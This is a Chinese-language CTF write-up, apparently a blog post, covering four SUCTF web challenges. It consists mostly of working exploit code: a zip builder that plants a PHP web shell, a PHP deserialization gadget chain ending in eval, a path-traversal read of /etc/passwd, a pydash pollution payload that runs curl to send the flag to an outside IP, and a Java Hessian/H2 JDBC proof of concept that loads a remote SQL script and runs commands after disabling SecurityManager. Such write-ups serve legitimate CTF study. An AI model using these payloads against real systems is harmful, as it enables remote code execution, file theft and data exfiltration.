# SUCTF-Web

    
    
&lt;!--more--&gt;    
## SU_photogallery  
https://blog.csdn.net/weixin_46203060/article/details/129350280  
拿到源码后，发现是关于 zip 的安全问题，参考 p 牛写的文章  
https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html  
生成 zip 文件，上传访问即可  
```Python  
import zipfile  
import io  
  
mf = io.BytesIO()  
with zipfile.ZipFile(mf, mode=&#34;w&#34;, compression=zipfile.ZIP_STORED) as zf:  
    zf.writestr(&#39;ctf.php&#39;, b&#39;@&lt;?php (&#34;sys&#34;.&#34;tem&#34;)($_GET[1]);?&gt;&#39;)  
    zf.writestr(&#39;A&#39;*5000, b&#39;AAAAA&#39;)  
  
with open(&#34;shell.zip&#34;, &#34;wb&#34;) as f:  
    f.write(mf.getvalue())  
```  
## SU_POP  
参考https://xz.aliyun.com/t/9995中间部分链子，  
构造 exp  
```PHP  
&lt;?php  
namespace React\Promise\Internal;  
use Cake\Http\Response;  
final class RejectedPromise{  
    private $handled = false;  
    private $reason;  
    public function __construct(){  
        $this-&gt;reason = new Response();  
    }  
}  
echo base64_encode(serialize(new RejectedPromise));  
namespace Cake\Http;  
use Cake\ORM\Table;  
class Response{  
    private $stream;  
    public function __construct(){  
        $this-&gt;stream = new Table();  
    }  
}  
namespace Cake\ORM;  
use Cake\ORM\BehaviorRegistry;  
class Table{  
    private $_behaviors;  
    public function __construct(){  
        $this-&gt;_behaviors = new BehaviorRegistry();  
    }  
}  
namespace Cake\ORM;  
  
use PHPUnit\Framework\MockObject\Generator\MockClass;  
  
class BehaviorRegistry{  
    protected array $_loaded = [];  
    protected array $_methodMap = [];  
    public function __construct(){  
        $this-&gt;_methodMap[&#39;rewind&#39;] = [&#39;test01&#39;,&#39;generate&#39;];  
        $this-&gt;_loaded[&#39;test01&#39;] = new MockClass;   
    }  
}  
namespace PHPUnit\Framework\MockObject\Generator;  
final class MockClass{  
    private $mockName;  
    private $classCode;  
    public function __construct(){  
        $this-&gt;mockName=&#39;test&#39;;  
        $this-&gt;classCode=&#39;eval($_GET[1]);&#39;;  
    }  
}  
?&gt;  
```  
## SU_blog  
读取文件  
`/article?file=articles/..././..././..././..././..././..././..././..././..././..././etc/passwd`  
源码  
```Python  
from flask import *  
import time,os,json,hashlib  
from pydash import set_  
  
app = Flask(__name__)  
app.config[&#39;SECRET_KEY&#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest()  
  
users = {&#34;testuser&#34;: &#34;password&#34;}  
BASE_DIR = &#39;/var/www/html/myblog/app&#39;  
  
articles = {  
    1: &#34;articles/article1.txt&#34;,  
    2: &#34;articles/article2.txt&#34;,  
    3: &#34;articles/article3.txt&#34;  
}  
  
friend_links = [  
    {&#34;name&#34;: &#34;bkf1sh&#34;, &#34;url&#34;: &#34;https://ctf.org.cn/&#34;},  
    {&#34;name&#34;: &#34;fushuling&#34;, &#34;url&#34;: &#34;https://fushuling.com/&#34;},  
    {&#34;name&#34;: &#34;yulate&#34;, &#34;url&#34;: &#34;https://www.yulate.com/&#34;},  
    {&#34;name&#34;: &#34;zimablue&#34;, &#34;url&#34;: &#34;https://www.zimablue.life/&#34;},  
    {&#34;name&#34;: &#34;baozongwi&#34;, &#34;url&#34;: &#34;https://baozongwi.xyz/&#34;},  
]  
  
class User():  
    def __init__(self):  
        pass  
  
user_data = User()  
@app.route(&#39;/&#39;)  
def index():  
    if &#39;username&#39; in session:  
        return render_template(&#39;blog.html&#39;, articles=articles, friend_links=friend_links)  
    return redirect(url_for(&#39;login&#39;))  
  
@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])  
def login():  
    if request.method == &#39;POST&#39;:  
        username = request.form[&#39;username&#39;]  
        password = request.form[&#39;password&#39;]  
        if username in users and users[username] == password:  
            session[&#39;username&#39;] = username  
            return redirect(url_for(&#39;index&#39;))  
        else:  
            return &#34;Invalid credentials&#34;, 403  
    return render_template(&#39;login.html&#39;)  
  
@app.route(&#39;/register&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])  
def register():  
    if request.method == &#39;POST&#39;:  
        username = request.form[&#39;username&#39;]  
        password = request.form[&#39;password&#39;]  
        users[username] = password  
        return redirect(url_for(&#39;login&#39;))  
    return render_template(&#39;register.html&#39;)  
  
@app.route(&#39;/change_password&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])  
def change_password():  
    if &#39;username&#39; not in session:  
        return redirect(url_for(&#39;login&#39;))  
  
    if request.method == &#39;POST&#39;:  
        old_password = request.form[&#39;old_password&#39;]  
        new_password = request.form[&#39;new_password&#39;]  
        confirm_password = request.form[&#39;confirm_password&#39;]  
  
        if users[session[&#39;username&#39;]] != old_password:  
            flash(&#34;Old password is incorrect&#34;, &#34;error&#34;)  
        elif new_password != confirm_password:  
            flash(&#34;New passwords do not match&#34;, &#34;error&#34;)  
        else:  
            users[session[&#39;username&#39;]] = new_password  
            flash(&#34;Password changed successfully&#34;, &#34;success&#34;)  
            return redirect(url_for(&#39;index&#39;))  
  
    return render_template(&#39;change_password.html&#39;)  
  
@app.route(&#39;/friendlinks&#39;)  
def friendlinks():  
    if &#39;username&#39; not in session or session[&#39;username&#39;] != &#39;admin&#39;:  
        return redirect(url_for(&#39;login&#39;))  
    return render_template(&#39;friendlinks.html&#39;, links=friend_links)  
  
@app.route(&#39;/add_friendlink&#39;, methods=[&#39;POST&#39;])  
def add_friendlink():  
    if &#39;username&#39; not in session or session[&#39;username&#39;] != &#39;admin&#39;:  
        return redirect(url_for(&#39;login&#39;))  
  
    name = request.form.get(&#39;name&#39;)  
    url = request.form.get(&#39;url&#39;)  
  
    if name and url:  
        friend_links.append({&#34;name&#34;: name, &#34;url&#34;: url})  
  
    return redirect(url_for(&#39;friendlinks&#39;))  
  
@app.route(&#39;/delete_friendlink/&lt;int:index&gt;&#39;)  
def delete_friendlink(index):  
    if &#39;username&#39; not in session or session[&#39;username&#39;] != &#39;admin&#39;:  
        return redirect(url_for(&#39;login&#39;))  
  
    if 0 &lt;= index &lt; len(friend_links):  
        del friend_links[index]  
  
    return redirect(url_for(&#39;friendlinks&#39;))  
  
@app.route(&#39;/article&#39;)  
def article():  
    if &#39;username&#39; not in session:  
        return redirect(url_for(&#39;login&#39;))  
  
    file_name = request.args.get(&#39;file&#39;, &#39;&#39;)  
    if not file_name:  
        return render_template(&#39;article.html&#39;, file_name=&#39;&#39;, content=&#34;未提供文件名。&#34;)  
  
    blacklist = [&#34;waf.py&#34;]  
    if any(blacklisted_file in file_name for blacklisted_file in blacklist):  
        return render_template(&#39;article.html&#39;, file_name=file_name, content=&#34;大黑阔不许看&#34;)  
      
    if not file_name.startswith(&#39;articles/&#39;):  
        return render_template(&#39;article.html&#39;, file_name=file_name, content=&#34;无效的文件路径。&#34;)  
      
    if file_name not in articles.values():  
        if session.get(&#39;username&#39;) != &#39;admin&#39;:  
            return render_template(&#39;article.html&#39;, file_name=file_name, content=&#34;无权访问该文件。&#34;)  
      
    file_path = os.path.join(BASE_DIR, file_name)  
    file_path = file_path.replace(&#39;../&#39;, &#39;&#39;)  
      
    try:  
        with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:  
            content = f.read()  
    except FileNotFoundError:  
        content = &#34;文件未找到。&#34;  
    except Exception as e:  
        app.logger.error(f&#34;Error reading file {file_path}: {e}&#34;)  
        content = &#34;读取文件时发生错误。&#34;  
  
    return render_template(&#39;article.html&#39;, file_name=file_name, content=content)  
@app.route(&#39;/admin&#39;,methods=[&#39;GET&#39;])  
def test():  
    return render_template(&#39;admin.html&#39;, user_data=user_data)  
  
@app.route(&#39;/Admin&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])  
def admin():  
    if request.args.get(&#39;pass&#39;)!=&#34;SUers&#34;:  
        return &#34;nonono&#34;  
    if request.method == &#39;POST&#39;:  
        try:  
            body = request.json  
  
            if not body:  
                flash(&#34;No JSON data received&#34;, &#34;error&#34;)  
                return jsonify({&#34;message&#34;: &#34;No JSON data received&#34;}), 400  
  
            key = body.get(&#39;key&#39;)  
            value = body.get(&#39;value&#39;)  
            print(key)  
            if key is None or value is None:  
                flash(&#34;Missing required keys: &#39;key&#39; or &#39;value&#39;&#34;, &#34;error&#34;)  
                return jsonify({&#34;message&#34;: &#34;Missing required keys: &#39;key&#39; or &#39;value&#39;&#34;}), 400  
  
            # if not pwaf(key):  
            #     flash(&#34;Invalid key format&#34;, &#34;error&#34;)  
            #     return jsonify({&#34;message&#34;: &#34;Invalid key format&#34;}), 400  
  
            # if not cwaf(value):  
            #     flash(&#34;Invalid value format&#34;, &#34;error&#34;)  
            #     return jsonify({&#34;message&#34;: &#34;Invalid value format&#34;}), 400  
  
            set_(user_data, key, value)  
            flash(&#34;User data updated successfully&#34;, &#34;success&#34;)  
            return jsonify({&#34;message&#34;: &#34;User data updated successfully&#34;}), 200  
  
        except json.JSONDecodeError:  
            flash(&#34;Invalid JSON data&#34;, &#34;error&#34;)  
            return jsonify({&#34;message&#34;: &#34;Invalid JSON data&#34;}), 400  
        except Exception as e:  
            flash(f&#34;An error occurred: {str(e)}&#34;, &#34;error&#34;)  
            return jsonify({&#34;message&#34;: f&#34;An error occurred: {str(e)}&#34;}), 500  
  
    return render_template(&#39;admin.html&#39;, user_data=user_data)  
  
@app.route(&#39;/logout&#39;)  
def logout():  
    session.pop(&#39;username&#39;, None)  
    flash(&#34;You have been logged out.&#34;, &#34;info&#34;)  
    return redirect(url_for(&#39;login&#39;))  
  
if __name__ == &#39;__main__&#39;:  
    app.run(host=&#39;0.0.0.0&#39;,port=10000)  
```  
`/Admin`存在原型链污染  
参考  
https://kdxcxs.github.io/posts/wp/idekctf-2022-task-manager-wp/  
https://tttang.com/archive/1876/#toc__13  
构造payload  
```SQL  
{&#34;key&#34;:&#34;__init__.__globals__.time.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.０&#34;,&#34;value&#34;:&#34;*;__import__(&#39;os&#39;).popen(&#39;curl http://8.137.71.171:1234/`/read&#39;&#43;&#39;f&#39;&#43;&#39;lag`&#39;);#&#34;}  
```  
## SU_solon  
入口点  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501132113331.png)
调用了`toString()`方法，直接用`Fastjson`中`JSONObject`的`getter`方法，  
因为有 h2 依赖，所以直接利用 CodeQL 查 `getter` 方法能直接调用`JDBC`连接的  
```ql  
import java  
  
predicate isGetterMethod(Method method) {  
    method.getName().indexOf(&#34;get&#34;) = 0 and  
    method.getName().length() &gt; 3 and  
    method.isPublic() and  
    method.fromSource() and  
    method.hasNoParameters()  
}  
  
predicate isJDBCConnection(MethodAccess call){  
    exists(  
        Method method |  
        method.hasQualifiedName(&#34;java.sql&#34;, &#34;DriverManager&#34;, &#34;getConnection&#34;) or  
        method.hasQualifiedName(&#34;javax.sql&#34;,&#34;DataSource&#34;,&#34;getConnection&#34;) |   
        call.getMethod() = method  
      )  
}  
  
from Method method,MethodAccess call  
where isGetterMethod(method) and isJDBCConnection(call) and call.getEnclosingCallable() = method  
  
select method,&#34;JDBC Method&#34;  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501152106843.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501152106073.png)
来触发`org.noear.solon.data.util.UnpooledDataSource#getConnection()`方法  
`lib`中也存在`h2`，直接打即可  
构造`payload`  
```java  
import com.alibaba.fastjson.JSONObject;    
import com.caucho.hessian.io.Hessian2Output;    
import com.caucho.hessian.io.SerializerFactory;    
import org.noear.solon.data.util.UnpooledDataSource;    
import java.io.ByteArrayOutputStream;    
import java.util.Base64;    
public class Poc {    
    
    public static void main(String[] args) throws Exception {    
    
        UnpooledDataSource unpooledDataSource = new UnpooledDataSource(); unpooledDataSource.setUrl(&#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://127.0.0.1:7777/poc.sql&#39;&#34;);    
        unpooledDataSource.setDriverClassName(&#34;org.h2.Driver&#34;);    
        JSONObject jsonObject = new JSONObject();    
        jsonObject.put(&#34;xx&#34;, unpooledDataSource);    
    
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    
        Hessian2Output hessianOutput = new Hessian2Output(byteArrayOutputStream);    
        hessianOutput.setSerializerFactory(new SerializerFactory());    
        hessianOutput.getSerializerFactory().setAllowNonSerializable(true);    
        hessianOutput.writeObject(jsonObject);    
        hessianOutput.flush();    
    
        byte[] data = byteArrayOutputStream.toByteArray();    
        Base64.Encoder encoder = Base64.getEncoder();    
        String payload = encoder.encodeToString(data);    
        System.out.println(payload);    
    }    
    
}  
```  
这里还禁用了`exec`，直接关掉即可  
```sql  
CREATE ALIAS EXEC AS &#39;    
    String shellexec(String cmd) throws Exception {            System.setSecurityManager(null);            Runtime.getRuntime().exec(cmd);            return &#34;Command executed successfully after disabling SecurityManager.&#34;;    }&#39;;    
CALL EXEC(&#39;open -a Calculator.app&#39;);  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501132115037.png)
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/suctf-web/  

